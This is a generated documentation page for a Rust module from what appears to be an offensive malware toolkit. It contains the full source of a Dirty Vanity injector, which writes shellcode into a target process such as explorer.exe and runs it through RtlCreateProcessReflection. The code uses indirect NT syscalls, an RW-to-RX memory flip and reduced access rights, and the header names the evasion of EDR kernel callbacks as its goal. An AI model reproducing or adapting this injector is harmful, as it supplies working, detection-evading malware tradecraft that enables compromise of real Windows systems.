# crowd — dirty_vanity.rs  (🔥 S TIER — upgraded from A: NtOpenProcess, RW→RX, minimal access)

| Field | Value |
|-------|-------|
| **Source** | `src/dark_crystal/crowd/src/dirty_vanity.rs` |
| **Lines** | 230 |
| **Tier** | U |
| **Cards** | T007-process-injection |
| **Role** | Dirty Vanity injection |
| **Unsafe blocks** | 1 |

## Purpose

# crowd — dirty_vanity.rs  (🔥 S TIER — upgraded from A: NtOpenProcess, RW→RX, minimal access)

## Dirty Vanity / Process Forking (OPSEC 9.0)

Uses `RtlCreateProcessReflection` to clone an existing running process.
The cloned ("reflected") process inherits the address space of the
original, including any shellcode we write into it beforehand.

Key OPSEC advantages:
- Bypasses `PspCreateProcessNotifyRoutine` kernel callbacks (EDRs)
- The reflected process is an orphan — no parent-child relationship
- No `NtCreateUserProcess` or `CreateProcess` calls
- Shellcode executes in a "legitimate" process context

Sources: crates/core/experimental/injection/process_reflection.rs +
Kurama/04_Process_Manipulation/Dirty_Vanity_Forking/

## Constants

- `RTL_CLONE_PROCESS_FLAGS_INHERIT_HANDLES`: `u32` = `0x00000002`
- `RTL_CLONE_PROCESS_FLAGS_NO_SYNCHRONIZE`: `u32` = `0x00000004`

## Types

### struct `ClientId` (line 28)

### struct `RtlpProcessReflectionInformation` (line 34)

### struct `ClientIdNt` (line 80)

### struct `ObjAttr` (line 85)

## Public API

### `reflect_and_inject` (line 62)
```rust
pub fn reflect_and_inject(target_pid: u32, shellcode: &[u8]) -> Result<u32, String>
```
Injects shellcode into a target process via Process Reflection (Dirty Vanity).

# Arguments
* `target_pid` — PID of the process to reflect (e.g. explorer.exe)
* `shellcode`  — The payload to execute in the reflected process

# Returns
`Ok(reflected_pid)` on success, `Err` on failure.

### `reflect_from_explorer` (line 226)
```rust
pub fn reflect_from_explorer(shellcode: &[u8]) -> Result<u32, String>
```
Convenience: reflect off of `explorer.exe`.

## Key Dependencies

- `use crate::mega_dbg;`

## Full Source

```rust
//! # crowd — dirty_vanity.rs  (🔥 S TIER — upgraded from A: NtOpenProcess, RW→RX, minimal access)
//!
//! ## Dirty Vanity / Process Forking (OPSEC 9.0)
//!
//! Uses `RtlCreateProcessReflection` to clone an existing running process.
//! The cloned ("reflected") process inherits the address space of the
//! original, including any shellcode we write into it beforehand.
//!
//! Key OPSEC advantages:
//! - Bypasses `PspCreateProcessNotifyRoutine` kernel callbacks (EDRs)
//! - The reflected process is an orphan — no parent-child relationship
//! - No `NtCreateUserProcess` or `CreateProcess` calls
//! - Shellcode executes in a "legitimate" process context
//!
//! Sources: crates/core/experimental/injection/process_reflection.rs +
//!          Kurama/04_Process_Manipulation/Dirty_Vanity_Forking/

#![allow(dead_code, non_snake_case)]

use std::ffi::c_void;
use std::ptr::null_mut;
#[allow(unused_imports)]
use crate::mega_dbg;

// ── NT Types ──────────────────────────────────────────────────────────────

#[repr(C)]
struct ClientId {
    unique_process: usize,
    unique_thread: usize,
}

#[repr(C)]
struct RtlpProcessReflectionInformation {
    reflection_process_handle: usize,
    reflection_thread_handle: usize,
    reflection_client_id: ClientId,
}

type RtlCreateProcessReflectionFn = unsafe extern "system" fn(
    process_handle: usize,
    flags: u32,
    start_routine: *mut c_void,
    start_context: *mut c_void,
    event_handle: usize,
    reflection_information: *mut RtlpProcessReflectionInformation,
) -> i32;

const RTL_CLONE_PROCESS_FLAGS_INHERIT_HANDLES: u32 = 0x00000002;
const RTL_CLONE_PROCESS_FLAGS_NO_SYNCHRONIZE: u32 = 0x00000004;

// ── Public API ────────────────────────────────────────────────────────────

/// Injects shellcode into a target process via Process Reflection (Dirty Vanity).
///
/// # Arguments
/// * `target_pid` — PID of the process to reflect (e.g. explorer.exe)
/// * `shellcode`  — The payload to execute in the reflected process
///
/// # Returns
/// `Ok(reflected_pid)` on success, `Err` on failure.
pub fn reflect_and_inject(target_pid: u32, shellcode: &[u8]) -> Result<u32, String> {
    if shellcode.is_empty() {
        return Err("DirtyVanity: empty shellcode".into());
    }

    mega_dbg!("DirtyVanity: targeting PID={} with {}B shellcode", target_pid, shellcode.len());

    unsafe {
        // 1. Open target process via NtOpenProcess (RecycledGate) with MINIMAL rights
        //    PROCESS_VM_OPERATION (0x0008) | PROCESS_VM_WRITE (0x0020) |
        //    PROCESS_VM_READ (0x0010) | PROCESS_DUP_HANDLE (0x0040) |
        //    PROCESS_CREATE_THREAD (0x0002) | PROCESS_CREATE_PROCESS (0x0080) = 0x00FA
        //    (was PROCESS_ALL_ACCESS = 0x001FFFFF — way too broad)
        //    PROCESS_CREATE_PROCESS is required by RtlCreateProcessReflection
        let desired_access: u32 = 0x00FA;

        // Build CLIENT_ID struct for NtOpenProcess
        #[repr(C)]
        struct ClientIdNt { unique_process: usize, unique_thread: usize }
        let mut cid = ClientIdNt { unique_process: target_pid as usize, unique_thread: 0 };

        // OBJECT_ATTRIBUTES (minimal, all zeroed)
        #[repr(C)]
        struct ObjAttr { length: u32, _rest: [u8; 44] } // sizeof = 48 on x64
        let mut oa: ObjAttr = std::mem::zeroed();
        oa.length = std::mem::size_of::<ObjAttr>() as u32;

        let mut h_process_raw: usize = 0;
        let status = crate::recycled::nt_open_process(
            &mut h_process_raw,
            desired_access,
            &mut oa as *mut _ as *mut c_void,
            &mut cid as *mut _ as *mut c_void,
        );

        if status < 0 || h_process_raw == 0 {
            return Err(format!("DirtyVanity: NtOpenProcess({}) failed (0x{:08x})", target_pid, status as u32));
        }

        mega_dbg!("DirtyVanity: handle to PID {} obtained (minimal access 0x{:x})", target_pid, desired_access);

        // 2. Allocate memory in target (RW — NOT RWX) via NtAllocateVirtualMemory
        let mut remote_mem: *mut c_void = null_mut();
        let mut region_size = shellcode.len();
        let status = crate::recycled::nt_allocate_virtual_memory(
            h_process_raw,
            &mut remote_mem,
            0,
            &mut region_size,
            0x00003000, // MEM_COMMIT | MEM_RESERVE
            0x04,       // PAGE_READWRITE (was PAGE_EXECUTE_READWRITE — RWX is a red flag)
        );

        if status < 0 || remote_mem.is_null() {
            crate::recycled::nt_close(h_process_raw);
            return Err(format!("DirtyVanity: NtAllocateVirtualMemory failed (0x{:08x})", status as u32));
        }

        mega_dbg!("DirtyVanity: allocated {} bytes at {:p} (RW)", shellcode.len(), remote_mem);

        // 3. Write shellcode via NtWriteVirtualMemory
        let mut written: usize = 0;
        let status = crate::recycled::nt_write_virtual_memory(
            h_process_raw,
            remote_mem,
            shellcode.as_ptr() as *const c_void,
            shellcode.len(),
            &mut written,
        );

        if status < 0 {
            let mut base = remote_mem;
            let mut sz: usize = 0;
            crate::recycled::nt_free_virtual_memory(h_process_raw, &mut base, &mut sz, 0x8000);
            crate::recycled::nt_close(h_process_raw);
            return Err(format!("DirtyVanity: NtWriteVirtualMemory failed (0x{:08x})", status as u32));
        }

        // 4. Flip RW → RX via NtProtectVirtualMemory (two-step: never RWX)
        let mut base_prot = remote_mem;
        let mut prot_size = shellcode.len();
        let mut old_protect: u32 = 0;
        crate::recycled::nt_protect_virtual_memory(
            h_process_raw,
            &mut base_prot,
            &mut prot_size,
            0x20, // PAGE_EXECUTE_READ
            &mut old_protect,
        );

        mega_dbg!("DirtyVanity: shellcode written (RW→RX) — resolving RtlCreateProcessReflection");

        // 5. Resolve RtlCreateProcessReflection
        let ntdll = winapi::um::libloaderapi::GetModuleHandleA(
            b"ntdll.dll\0".as_ptr() as *const i8,
        );
        if ntdll.is_null() {
            let mut base = remote_mem;
            let mut sz: usize = 0;
            crate::recycled::nt_free_virtual_memory(h_process_raw, &mut base, &mut sz, 0x8000);
            crate::recycled::nt_close(h_process_raw);
            return Err("DirtyVanity: ntdll.dll not found".into());
        }

        let rtl_fn_ptr = winapi::um::libloaderapi::GetProcAddress(
            ntdll,
            b"RtlCreateProcessReflection\0".as_ptr() as *const i8,
        );
        if rtl_fn_ptr.is_null() {
            let mut base = remote_mem;
            let mut sz: usize = 0;
            crate::recycled::nt_free_virtual_memory(h_process_raw, &mut base, &mut sz, 0x8000);
            crate::recycled::nt_close(h_process_raw);
            return Err("DirtyVanity: RtlCreateProcessReflection not found".into());
        }

        let rtl_create_process_reflection: RtlCreateProcessReflectionFn =
            std::mem::transmute(rtl_fn_ptr);

        // 6. Create process reflection with shellcode as start routine
        let mut info: RtlpProcessReflectionInformation = std::mem::zeroed();
        let status = rtl_create_process_reflection(
            h_process_raw,
            RTL_CLONE_PROCESS_FLAGS_INHERIT_HANDLES | RTL_CLONE_PROCESS_FLAGS_NO_SYNCHRONIZE,
            remote_mem,       // StartRoutine — our shellcode
            null_mut(),       // StartContext
            0,                // EventHandle
            &mut info,
        );

        if status == 0 {
            let reflected_pid = info.reflection_client_id.unique_process as u32;
            mega_dbg!(
                "DirtyVanity: reflection created — PID={} (h_proc=0x{:x} h_thread=0x{:x})",
                reflected_pid, info.reflection_process_handle, info.reflection_thread_handle
            );

            // Close reflection handles via NtClose
            if info.reflection_process_handle != 0 {
                crate::recycled::nt_close(info.reflection_process_handle);
            }
            if info.reflection_thread_handle != 0 {
                crate::recycled::nt_close(info.reflection_thread_handle);
            }

            // Cleanup remote memory in original (optional — reflected process has its own copy)
            let mut base = remote_mem;
            let mut sz: usize = 0;
            crate::recycled::nt_free_virtual_memory(h_process_raw, &mut base, &mut sz, 0x8000);
            crate::recycled::nt_close(h_process_raw);

            Ok(reflected_pid)
        } else {
            mega_dbg!("DirtyVanity: RtlCreateProcessReflection failed (0x{:08x})", status as u32);
            let mut base = remote_mem;
            let mut sz: usize = 0;
            crate::recycled::nt_free_virtual_memory(h_process_raw, &mut base, &mut sz, 0x8000);
            crate::recycled::nt_close(h_process_raw);
            Err(format!("DirtyVanity: reflection failed (NTSTATUS 0x{:08x})", status as u32))
        }
    }
}

/// Convenience: reflect off of `explorer.exe`.
pub fn reflect_from_explorer(shellcode: &[u8]) -> Result<u32, String> {
    let pid = crate::ppid::find_pid_by_name("explorer.exe")
        .ok_or_else(|| "DirtyVanity: explorer.exe not found".to_string())?;
    reflect_and_inject(pid, shellcode)
}

```